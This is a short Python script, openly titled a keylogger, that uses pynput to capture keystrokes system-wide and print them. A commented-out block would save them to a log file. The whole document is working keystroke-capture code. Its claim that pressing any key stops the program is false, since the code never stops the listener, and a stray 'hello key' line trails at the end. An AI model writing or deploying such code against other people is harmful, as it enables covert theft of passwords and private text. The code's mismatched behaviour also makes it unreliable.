"""basic keylogger program"""
from pynput import keyboard
# Define the file path for storing captured keys (commented out by default)
# log_file = "key_log.txt"
def on_press(key):
  # Check for well-known special keys (modify as needed)
  if key in [keyboard.Key.esc, keyboard.Key.tab, keyboard.Key.ctrl, keyboard.Key.shift, keyboard.Key.alt]:
    return  
  # Print the pressed key (for demonstration purposes)
  print(f"Pressed: {key}")

  # You can uncomment this block to save keystrokes to a file
  # with open(log_file, 'a') as f:
  #   f.write(f"{key}\n")
# Create the listener
listener = keyboard.Listener(on_press=on_press)
# Start the listener
listener.start()
# Uncomment to stop the program after a set time (e.g., 10 seconds)
# import time
# time.sleep(10)
print("Press any key to stop the program.")
listener.join()

print("Program stopped.")
   hello key 
